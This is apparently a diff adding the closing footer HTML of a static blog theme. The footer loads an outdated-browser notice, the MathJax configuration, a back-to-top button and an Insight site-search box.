+<script src="/js/gallery.js" defer></script>
+
+
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+
+<a id="back-to-top" title="Back to Top" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
